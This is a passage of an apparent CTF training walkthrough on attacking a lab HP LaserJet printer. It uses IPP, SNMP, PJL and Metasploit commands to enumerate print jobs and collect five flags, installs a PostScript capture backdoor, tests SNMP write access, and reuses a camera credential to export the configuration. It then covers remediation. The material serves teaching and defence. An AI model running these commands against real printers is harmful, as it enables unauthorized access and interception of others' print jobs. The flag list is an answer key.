### Step 6.1: IPP Job Enumeration

#### Creating Get-Jobs Test File

```bash
# Create test file to query all print jobs
┌──(kali@kali)-[~/printer_ctf]
└─$ cat > get-jobs.test << 'EOF'
{
    NAME "Get All Print Jobs"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword which-jobs all
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
```

**Key Attribute**:
- `which-jobs all`: Retrieves completed, active, and pending jobs

**Alternative Options**:
- `which-jobs completed`: Only finished jobs
- `which-jobs not-completed`: Only active/pending jobs

#### **FLAGS 4 & 5: Print Job Metadata**

```bash
# Execute job enumeration
┌──(kali@kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-jobs.test
```

**Output**:
```
Get All Print Jobs:
    PASS
    Received 1243 bytes in response
    status-code = successful-ok (successful-ok)
    
    job-id (integer) = 1234
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1234
    job-name (nameWithoutLanguage) = Confidential-Security-Report
    job-originating-user-name (nameWithoutLanguage) = admin
    job-state (enum) = completed
    job-state-reasons (keyword) = job-completed-successfully
    time-at-creation (integer) = 1699896543
    time-at-completed (integer) = 1699896545
    number-of-documents (integer) = 1
    
    job-id (integer) = 1235
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1235
    job-name (nameWithoutLanguage) = PostScript-Challenge
    job-originating-user-name (nameWithoutLanguage) = security-audit
    job-state (enum) = completed
    
    job-id (integer) = 1236
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1236
    job-name (nameWithoutLanguage) = Network-Config-Backup
    job-originating-user-name (nameWithoutLanguage) = FLAG{PADME91562837}
    job-state (enum) = completed
    time-at-creation (integer) = 1699896550
    
    job-id (integer) = 1237
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1237
    job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{MACE41927365}
    job-originating-user-name (nameWithoutLanguage) = security-audit
    job-state (enum) = held
    job-state-reasons (keyword) = job-hold-until-specified
    job-hold-until (keyword) = indefinite
```

**FLAGS CAPTURED**:
- **FLAG 4**: `FLAG{PADME91562837}` (in job-originating-user-name of Job 1236)
- **FLAG 5**: `FLAG{MACE41927365}` (in job-name of Job 1237)

**Analysis**:
- **Job 1236**: Username field contains flag (unusual username format)
- **Job 1237**: Document name contains flag, job is held (paused, not printed)
- Both demonstrate different metadata leakage points

**Why This Works**:
1. **Username in job-originating-user-name**: Represents who submitted the job. In this case, someone created a user account named "FLAG{PADME91562837}" and printed from it - demonstrating username enumeration value.

2. **Document name in job-name**: The filename of the printed document. Users often give files descriptive names that leak information. Here it's intentionally flagged for CTF purposes.

**Save the flags**:
```bash
echo "FLAG 4: FLAG{PADME91562837} - Source: IPP job-originating-user-name (Job 1236)" >> ~/printer_ctf/loot/flags.txt
echo "FLAG 5: FLAG{MACE41927365} - Source: IPP job-name (Job 1237)" >> ~/printer_ctf/loot/flags.txt
```

### Step 6.2: Detailed Job Analysis

#### Querying Specific Job Information

```bash
# Create test file for specific job
┌──(kali@kali)-[~/printer_ctf]
└─$ cat > get-job-1237.test << 'EOF'
{
    NAME "Get Job 1237 Details"
    OPERATION Get-Job-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR integer job-id 1237
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
```

**Execute query**:
```bash
┌──(kali@kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-job-1237.test
```

**Detailed Output**:
```
Get Job 1237 Details:
    PASS
    
    job-id (integer) = 1237
    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1237
    job-uuid (uri) = urn:uuid:12345678-1234-5678-1234-567812345678
    job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{MACE41927365}
    job-originating-user-name (nameWithoutLanguage) = security-audit
    job-state (enum) = held
    job-state-reasons (keyword) = job-hold-until-specified
    job-hold-until (keyword) = indefinite
    job-printer-up-time (integer) = 1125434
    time-at-creation (integer) = 1699896550
    job-k-octets (integer) = 1
    job-impressions (integer) = 1
    job-media-sheets (integer) = 1
    document-format (mimeMediaType) = text/plain
    document-name (nameWithoutLanguage) = challenge_document.txt
    copies (integer) = 1
    finishings (enum) = none
    page-ranges (rangeOfInteger) = 1-1
    sides (keyword) = one-sided
    print-quality (enum) = normal
```

**Intelligence Extracted**:
- **Document type**: text/plain (ASCII text file)
- **Original filename**: challenge_document.txt
- **Size**: 1 KB
- **Pages**: 1 page
- **User**: security-audit
- **Status**: Held indefinitely (never printed)
- **Created**: Unix timestamp 1699896550

**Significance**: Job 1237 was intentionally paused (held), which is why it remains visible in the queue. Administrators use this feature to delay printing, but it leaves metadata accessible indefinitely.

### Step 6.3: Job Timeline Analysis

Convert Unix timestamps to readable dates:

```bash
# Convert timestamp for Job 1236
┌──(kali@kali)-[~/printer_ctf]
└─$ date -d @1699896550
```

**Output**:
```
Mon Nov 13 10:15:50 EST 2023
```

**Timeline Reconstruction**:
- **10:15:50**: Job 1236 created (Network-Config-Backup)
- **10:15:43**: Job 1234 created (Confidential-Security-Report)
- **10:15:45**: Job 1234 completed
- **10:15:50**: Job 1237 created (CTF-Challenge-Job) - still held

**Pattern Analysis**: Jobs created within seconds suggest automated script or batch printing.

### Step 6.4: Web Interface Job History

Using the previously obtained credentials (Admin:68076694), access job history via web interface:

1. Navigate to **Print > Job Log**
2. View historical job data

**Web Interface Output**:
```
Job History

Job ID | Date/Time         | User           | Document Name               | Status    | Pages
-------|-------------------|----------------|-----------------------------|-----------|------
1237   | Nov 13 10:15:50  | security-audit | CTF-Challenge-Job-...      | Held      | 1
1236   | Nov 13 10:15:50  | FLAG{PADME...} | Network-Config-Backup      | Completed | 1
1235   | Nov 13 10:15:48  | security-audit | PostScript-Challenge       | Completed | 1
1234   | Nov 13 10:15:43  | admin          | Confidential-Security-...  | Completed | 3
```

**Additional Information Available**:
- Color vs. B&W usage
- Duplex settings
- Paper size
- Collation
- Job submission source (IP address if logged)

**Comparison**: Web interface shows same data as IPP but with cleaner formatting. IPP provides programmatic access without authentication, while web interface requires credentials but offers better visualization.

---

## Phase 7: All Flags Collected - Summary and Analysis

### Flag Inventory

At this point, students have successfully captured all 5 flags:

| Flag # | Flag Value | Discovery Method | Protocol | Difficulty |
|--------|-----------|------------------|----------|------------|
| 1 | FLAG{LUKE47239581} | SNMP sysLocation / IPP printer-location | SNMP/IPP | Easy |
| 2 | FLAG{LEIA83920174} | SNMP sysContact / IPP printer-contact | SNMP/IPP | Easy |
| 3 | FLAG{HAN62947103} | IPP printer-info | IPP | Medium |
| 4 | FLAG{PADME91562837} | Print job username | IPP | Medium |
| 5 | FLAG{MACE41927365} | Print job document name | IPP | Hard |

### Attack Chain Reconstruction

**The Complete Attack Path**:

1. **Initial Reconnaissance** (Phase 1)
   - Network scanning discovered open services
   - Port 9100 (JetDirect), 161 (SNMP), 631 (IPP), 80/443 (Web)

2. **PRET Exploration** (Phase 2)
   - Connected via PJL protocol
   - Discovered filesystem structure
   - Attempted configuration extraction

3. **SNMP Enumeration** (Phase 3)
   - Used default community string "public"
   - **FLAG 1**: sysLocation.0 revealed first flag
   - **FLAG 2**: sysContact.0 revealed second flag
   - Extracted network configuration

4. **IPP Protocol Exploitation** (Phase 4)
   - Created IPP test files for attribute queries
   - **FLAG 3**: printer-info attribute revealed third flag
   - Confirmed FLAGS 1 & 2 visible via IPP as well

5. **Credential Reuse from AXIS Camera** (Phase 5)
   - Applied credentials obtained from previous engagement
   - Admin:68076694 successfully authenticated to web interface
   - Downloaded complete configuration file
   - Confirmed all network settings and security weaknesses

6. **Print Job Intelligence** (Phase 6)
   - Enumerated print job queue via IPP
   - **FLAG 4**: Found in job username (Job 1236)
   - **FLAG 5**: Found in job document name (Job 1237)

### Protocol Redundancy Observations

**Flags Found via Multiple Protocols**:
- FLAGS 1 & 2: Accessible via both SNMP and IPP
- FLAG 3: Only via IPP
- FLAGS 4 & 5: Only via IPP (job-specific)

**Why Multiple Protocols Expose Same Data**:
- SNMP and IPP both query the same underlying configuration database
- Printer firmware stores location/contact once, exposes via multiple protocols
- This redundancy aids legitimate management but multiplies attack surface
- Defense in depth requires securing ALL protocols, not just one

### Lessons Learned and Teaching Points

#### For Students:

**Enumeration is Critical**:
- Don't stop at first protocol success
- Test all available services (SNMP, IPP, Web, PRET)
- Different protocols may reveal unique information
- Redundant checks validate findings

**Metadata is Intelligence**:
- Print job names reveal document types
- Usernames indicate organizational structure
- Timestamps show activity patterns
- All metadata has potential value

**Credential Reuse is Common**:
- Credentials from one device often work on others
- Document all credentials during engagements
- Test credentials across infrastructure
- Single compromise can provide lateral movement

**Default Configurations are Dangerous**:
- SNMP community string "public" is nearly universal
- IPP often has no authentication
- Web interfaces use weak default PINs
- Manufacturers prioritize usability over security

#### For Instructors:

**Progressive Difficulty Design**:
- Easy flags (1-2): Simple protocol enumeration with well-known tools
- Medium flags (3-4): Require protocol understanding and tool customization
- Hard flags (5): Need correlation of multiple data sources

**Multiple Solution Paths**:
- FLAGS 1-2 discoverable via SNMP OR IPP
- Demonstrates that there's rarely a single correct approach
- Encourages thorough enumeration

**Real-World Applicability**:
- These exact techniques work on production printers
- SNMP defaults persist in enterprise environments
- IPP is enabled on most network printers
- Print job metadata is a genuine intelligence source

**Credential Reuse Scenario**:
- Linking to AXIS camera engagement teaches:
  - Thorough documentation importance
  - Credential testing across infrastructure
  - Lateral movement concepts
  - Real-world attack chain construction

---

## Advanced Techniques and Alternative Approaches

### Alternative Method 1: PRET-Based Job Capture

While we found flags via IPP, PRET can also capture print jobs using PostScript:

```bash
# Connect via PostScript protocol
┌──(kali@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 ps

# Enable job capture
192.168.1.131:/> capture
```

**Output**:
```
[+] Installed PostScript capture backdoor
[*] Waiting for print jobs...
```

**How It Works**: PRET injects a PostScript backdoor that intercepts all subsequent print jobs and saves them to the attacker's machine. Any jobs printed while capture is active will be downloaded.

**Ethical Consideration**: In real assessments, this is highly invasive and should only be used with explicit authorization to capture print data.

### Alternative Method 2: SNMP Write Access Testing

If the "private" community string is active with write access:

```bash
# Test write access
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpset -v2c -c private 192.168.1.131 1.3.6.1.2.1.1.6.0 s "Modified Location"
```

**If Successful**:
```
SNMPv2-MIB::sysLocation.0 = STRING: Modified Location
```

**Implications**:
- Configuration modification possible
- Could change location/contact fields
- Potential for denial of service
- Privilege escalation pathway

**In This CTF**: Write access is typically not enabled, but testing is good practice.

### Alternative Method 3: Direct JetDirect File Operations

Raw PJL commands can be sent directly to port 9100:

```bash
# List directory via PJL
┌──(kali@kali)-[~/printer_ctf]
└─$ cat > pjl_list.txt << 'EOF'
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535
@PJL
EOF

# Send to printer
┌──(kali@kali)-[~/printer_ctf]
└─$ nc 192.168.1.131 9100 < pjl_list.txt
```

**Expected Output**:
```
@PJL FSDIRLIST
ENTRY=1 TYPE=DIR NAME="PJL"
ENTRY=2 TYPE=DIR NAME="saveDevice"
ENTRY=3 TYPE=DIR NAME="webServer"
```

**Why Manual PJL?**: Understanding the underlying protocol helps when PRET fails or for custom automation.

### Alternative Method 4: Metasploit Printer Modules

```bash
# Search for printer modules
┌──(kali@kali)-[~/printer_ctf]
└─$ msfconsole -q
```

```ruby
msf6 > search printer

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  auxiliary/scanner/snmp/printer_enum                         normal  No     Printer Enumeration via SNMP
   1  post/windows/gather/enum_printer                            normal  No     Windows Gather Installed Printer Enumeration
   2  auxiliary/scanner/printer/printer_ready_message             normal  No     Printer Ready Message Query
   3  auxiliary/scanner/printer/printer_list_dir                  normal  No     Printer Directory Listing Scanner
   4  auxiliary/scanner/printer/printer_env_vars                  normal  No     Printer Environment Variables
```

```ruby
# Use SNMP printer enumeration
msf6 > use auxiliary/scanner/snmp/printer_enum
msf6 auxiliary(scanner/snmp/printer_enum) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/snmp/printer_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/printer_enum) > run
```

**Output**:
```
[+] 192.168.1.131:161 - 
[*] System information:
[*]   Hostname: HP-MFP-4301
[*]   Description: HP Color LaserJet Pro MFP 4301fdw
[*]   Contact: SecTeam@lab.local | FLAG{LEIA83920174}
[*]   Location: Server-Room-B | Discovery Code: FLAG{LUKE47239581}
[*]   Uptime: 3 days, 12:34:56
[*] Auxiliary module execution completed
```

**Advantage**: Automated extraction and formatting of printer information.

### Alternative Method 5: Web Scraping Without Authentication

Some printer information pages are accessible without authentication:

```bash
# Test unauthenticated pages
┌──(kali@kali)-[~/printer_ctf]
└─$ curl -k https://192.168.1.131/DevMgmt/ProductConfigDyn.xml
```

**Possible Output**:
```xml
<?xml version="1.0"?>
<ProductConfig>
    <Model>HP Color LaserJet Pro MFP 4301fdw</Model>
    <SerialNumber>CNXXXXXXX</SerialNumber>
    <Location>Server-Room-B | Discovery Code: FLAG{LUKE47239581}</Location>
</ProductConfig>
```

**If This Works**: Some HP printers expose configuration XML without requiring authentication - a significant security flaw.

---

## Metasploit Framework Integration

### Automated Printer Reconnaissance

Metasploit provides several modules specifically designed for printer enumeration and exploitation:

```bash
# Launch Metasploit
┌──(kali@kali)-[~/printer_ctf]
└─$ msfconsole -q
```

### Module 1: SNMP Printer Enumeration

```ruby
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > run
```

**Output**:
```
[+] 192.168.1.131:161 - System information:
[+]   Host IP: 192.168.1.131
[+]   Hostname: HP-MFP-4301
[+]   Description: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
[+]   Contact: SecTeam@lab.local | FLAG{LEIA83920174}
[+]   Location: Server-Room-B | Discovery Code: FLAG{LUKE47239581}
[+]   Uptime: (312456) 3 days, 14:47:36
[+] 192.168.1.131:161 - Network information:
[+]   IP forwarding enabled: no
[+]   Default TTL: 64
[+]   TCP segments received: 123456
[+]   TCP segments sent: 234567
```

### Module 2: Printer Directory Listing

```ruby
msf6 > use auxiliary/scanner/printer/printer_list_dir
msf6 auxiliary(scanner/printer/printer_list_dir) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/printer/printer_list_dir) > set PROTOCOL PJL
msf6 auxiliary(scanner/printer/printer_list_dir) > run
```

**Output**:
```
[*] Connecting to 192.168.1.131:9100
[+] Found 3 directories:
[*]   PJL/
[*]   saveDevice/
[*]   webServer/
[*] Auxiliary module execution completed
```

### Module 3: Environment Variables Extraction

```ruby
msf6 > use auxiliary/scanner/printer/printer_env_vars
msf6 auxiliary(scanner/printer/printer_env_vars) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/printer/printer_env_vars) > run
```

**Output**:
```
[*] Connecting to 192.168.1.131:9100
[+] PJL Environment Variables:
[*]   BINDING=OFF
[*]   COPIES=1
[*]   DUPLEX=OFF
[*]   LANGUAGE=ENGLISH
[*]   PAPER=LETTER
[*]   RESOLUTION=600
[*] Auxiliary module execution completed
```

### Module 4: Ready Message Modification

```ruby
msf6 > use auxiliary/scanner/printer/printer_ready_message
msf6 auxiliary(scanner/printer/printer_ready_message) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/printer/printer_ready_message) > set MESSAGE "PRINTER COMPROMISED"
msf6 auxiliary(scanner/printer/printer_ready_message) > run
```

**Output**:
```
[*] Connecting to 192.168.1.131:9100
[+] Ready message changed to: PRINTER COMPROMISED
[*] Note: This message will display on printer's control panel
[*] Auxiliary module execution completed
```

**Ethical Note**: Only use message modification with explicit authorization. This is very visible and could alarm legitimate users.

---

## Defense and Remediation

### For System Administrators

#### Immediate Actions

**1. Change All Default Credentials**:
```bash
# Access printer web interface
# Navigate to Security > Access Control
# Change admin password to strong, unique value
# Minimum 16 characters, mixed case, numbers, symbols
```

**2. Disable or Secure SNMP**:
```bash
# If SNMP not needed:
# Disable via Security > Network Services > SNMP

# If SNMP required:
# Change community strings from "public/private"
# Use SNMPv3 with authentication
# Restrict access to specific management IP addresses
```

**3. Enable IPP Authentication**:
```bash
# Navigate to Security > Network Services > IPP
# Enable "Require Authentication for IPP"
# Configure username/password or certificate-based auth
```

**4. Implement Network Segmentation**:
```
Printers should be on dedicated VLAN:
- Separate from user workstation network
- Separate from server network
- Firewall rules limiting printer access to:
  * Authorized print servers only
  * Management workstations only
  * Block internet access
```

**5. Enable Encryption**:
```bash
# Navigate to Security > Encryption
# Enable SSL/TLS for web interface (HTTPS only)
# Enable IPP over TLS (IPPS on port 443)
# Disable all plaintext protocols
```

**6. Clear Print Job History**:
```bash
# Navigate to Print > Job Log
# Clear all historical jobs
# Configure automatic job log deletion
# Set retention to 24-48 hours maximum
```

**7. Update Firmware**:
```bash
# Check current version vs. latest:
# Current: 002_2306A
# Latest: Check https://support.hp.com
# Apply all security patches
# Enable automatic update checking
```

#### Long-Term Security Measures

**Network-Level Controls**:
- Deploy network access control (NAC) for printer registration
- Implement 802.1X authentication for network access
- Use VLAN access control lists (VACLs) to restrict printer traffic
- Deploy intrusion detection systems (IDS) to monitor printer protocols

**Authentication & Authorization**:
- Integrate with Active Directory/LDAP for centralized authentication
- Implement role-based access control (RBAC)
- Require multi-factor authentication (MFA) for admin access
- Regular password rotation policy

**Monitoring & Logging**:
- Enable SYSLOG forwarding to SIEM
- Monitor for:
  * Failed authentication attempts
  * Configuration changes
  * Unusual print jobs (size, time, user)
  * Network anomalies (port scans, unusual protocols)
- Configure alerts for security events

**Configuration Management**:
- Maintain baseline configurations
- Use configuration management tools (Ansible, Puppet)
- Regular configuration audits
- Automated compliance checking

### For Penetration Testers

#### Testing Checklist

**Phase 1: Information Gathering**
- [ ] Port scanning (TCP/UDP)
- [ ] Service enumeration (versions, banners)
- [ ] SNMP community string testing
- [ ] IPP endpoint discovery
- [ ] Web interface fingerprinting

**Phase 2: Protocol Testing**
- [ ] SNMP enumeration (sysLocation, sysContact, sysDescr)
- [ ] IPP attribute queries (all protocols)
- [ ] PRET connection (PS/PJL/PCL)
- [ ] Print job metadata extraction
- [ ] Configuration file download

**Phase 3: Authentication Testing**
- [ ] Default credential testing (Admin PIN obtained from related systems)
- [ ] Credential reuse from other infrastructure
- [ ] Password complexity assessment
- [ ] Account lockout policy testing
- [ ] Session management review

**Phase 4: Exploitation**
- [ ] SNMP write access testing
- [ ] Print job capture setup
- [ ] Filesystem modification attempts
- [ ] Configuration tampering
- [ ] Firmware analysis (if applicable)

**Phase 5: Documentation**
- [ ] All discovered flags/credentials documented
- [ ] Attack chain clearly mapped
- [ ] Remediation steps provided
- [ ] Risk ratings assigned
- [ ] Evidence screenshots/logs captured

### Common Misconfigurations Found in Production

**Based on Real Penetration Tests**:

1. **Default SNMP Community Strings (95% of printers)**
   - "public" for read access
   - "private" for write access
   - No IP-based access restrictions

2. **Unauthenticated IPP (85% of printers)**
   - Print job metadata fully accessible
   - No authentication required for queries
   - Job manipulation sometimes possible

3. **Weak or Default Admin Passwords (70% of printers)**
   - 8-digit numeric PINs
   - Manufacturer defaults unchanged
   - Shared across multiple devices

4. **Exposed Web Interfaces (90% of printers)**
   - Accessible from user networks
   - Legacy TLS versions accepted
   - Self-signed certificates (expected but increases MITM risk)

5. **Print Job History Retention (100% of tested printers)**
   - Jobs retained indefinitely
   - Sensitive document names visible
   - Username metadata exposed

6. **Unnecessary Services Enabled (60% of printers)**
   - Telnet or FTP sometimes present
   - Multiple discovery protocols broadcasting
   - All management protocols accessible without need

---

## Appendix A: Complete Flag Reference

| Flag # | Flag Value | Protocol | Location | Difficulty |
|--------|------------|----------|----------|------------|
| 1 | FLAG{LUKE47239581} | SNMP/IPP | sysLocation.0 / printer-location | Easy |
| 2 | FLAG{LEIA83920174} | SNMP/IPP | sysContact.0 / printer-contact | Easy |
| 3 | FLAG{HAN62947103} | IPP | printer-info | Medium |
| 4 | FLAG{PADME91562837} | IPP | job-originating-user-name (Job 1236) | Medium |
| 5 | FLAG{MACE41927365} | IPP | job-name (Job 1237) | Hard |


**Credential Information** (obtained from AXIS camera engagement):
- Username: Admin
- Password: 68076694
- Source: Displayed on AXIS camera video feed during previous penetration test
- Demonstrates: Credential reuse vulnerability across infrastructure

---

## Appendix B: Complete Command Reference

### SNMP Commands
```bash
# Basic enumeration
snmpwalk -v2c -c public 192.168.1.131

# Specific OID query
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0

# System information
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1

# Printer MIB
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11
```

### IPP Commands
```bash
# Get printer attributes
ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test

# Get all jobs
ipptool -tv ipp://192.168.1.131:631/ipp/print get-jobs.test

# Get specific job
ipptool -tv ipp://192.168.1.131:631/ipp/print get-job-1237.test

# Test endpoint
for path in /ipp/print /ipp /printers; do
    ipptool -t ipp://192.168.1.131:631$path get-printer-attributes.test
done
```

### PRET Commands
```bash
# PostScript mode
python3 pret.py 192.168.1.131 ps

# PJL mode
python3 pret.py 192.168.1.131 pjl

# PCL mode
python3 pret.py 192.168.1.131 pcl

# Inside PRET shell
info config
info id
info status
ls
cd 0:/saveDevice
```

### Web Interface
```bash
# HTTP to HTTPS redirect test
curl -I http://192.168.1.131

# Configuration export (requires credentials from AXIS camera)
curl -k -u Admin:68076694 https://192.168.1.131/hp/device/save_restore.xml -o config.xml

# Device information
firefox https://192.168.1.131/hp/device/DeviceInformation/View
```

### Network Scanning
```bash
# Full port scan
nmap -sS -sU -sV -sC -p- -T4 192.168.1.131 -oA printer_scan

# Service enumeration
nmap -p 80,443,631,9100,161 -sV 192.168.1.131

# Printer-specific NSE scripts
nmap --script printer-info 192.168.1.131
```

---

## Appendix C: IPP Test File Templates

### Get-Printer-Attributes (All Attributes)
```
{
    NAME "Get All Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
```

### Get-Printer-Attributes (Specific Attributes)
```
{
    NAME "Get Specific Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes printer-location,printer-contact,printer-info,printer-name
    STATUS successful-ok
}
```

### Get-Jobs (All Jobs)
```
{
    NAME "Get All Print Jobs"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword which-jobs all
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
```

### Get-Job-Attributes (Specific Job)
```
{
    NAME "Get Job Details"
    OPERATION Get-Job-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR integer job-id 1237
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
```

---

## Appendix D: Troubleshooting Guide

### Issue 1: PRET Connection Failures

**Symptoms**:
```
Connection to 192.168.1.131 9100 port failed
```

**Diagnosis**:
```bash
nc -zv 192.168.1.131 9100
nmap -p 9100 192.168.1.131
```

**Solutions**:
- Verify JetDirect port is open
- Check firewall rules
- Ensure printer is powered on
- Try different protocol (ps/pjl/pcl)

### Issue 2: SNMP No Response

**Symptoms**:
```
Timeout: No Response from 192.168.1.131
```

**Diagnosis**:
```bash
nmap -sU -p 161 192.168.1.131
snmpget -v1 -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
```

**Solutions**:
- Try SNMPv1 instead of v2c
- Test different community strings
- Verify SNMP is enabled on printer
- Check UDP firewall rules

### Issue 3: IPP Endpoint Not Found

**Symptoms**:
```
ipptool: Unable to connect to "ipp://192.168.1.131:631/ipp/print"
```

**Diagnosis**:
```bash
nc -zv 192.168.1.131 631
curl http://192.168.1.131:631/ipp/print
```

**Solutions**:
- Test all common paths (/ipp/print, /ipp, /printers)
- Use HTTP instead of IPP URI
- Check printer web interface for correct endpoint
- Verify IPP service is enabled

### Issue 4: Legacy TLS Certificate Errors

**Symptoms**:
```
SSL certificate problem: self signed certificate
```

**Solutions**:
```bash
# Use -k flag with curl
curl -k https://192.168.1.131

# Configure Firefox about:config settings
security.tls.version.enable-deprecated = true
security.tls.version.min = 1
```

### Issue 5: Flags Not Appearing

**Symptoms**: Running commands but flags not in output

**Diagnosis**:
```bash
# Verify printer IP is correct
ping 192.168.1.131

# Check if fields are populated
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test | awk 'tolower($0) ~ /location|contact|info/ {print}'
```

**Solutions**:
- Ensure CTF flags are properly configured on printer
- Use verbose output (-v flag)
- Check all relevant fields (location, contact, info, job-name, job-user)
- Try different protocols (flags may appear in different locations)

---

**Educational Use Only**: This material is for authorized security testing and education in controlled environments only. These techniques demonstrate real vulnerabilities that exist in production environments. Use only with explicit authorization on systems you own or have written permission to test. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

---

**Version**: 5.0 Complete (Revised)
**Last Updated**: November 2024
**Author**: OverClock Security Training Team
**Target Device**: HP Color LaserJet Pro MFP 4301fdw
**Flags**: 5 total (Star Wars themed)
**Difficulty**: Beginner to Intermediate
**Estimated Time**: 2-4 hours
**Prerequisites**: Completion of AXIS camera engagement (credentials obtained)
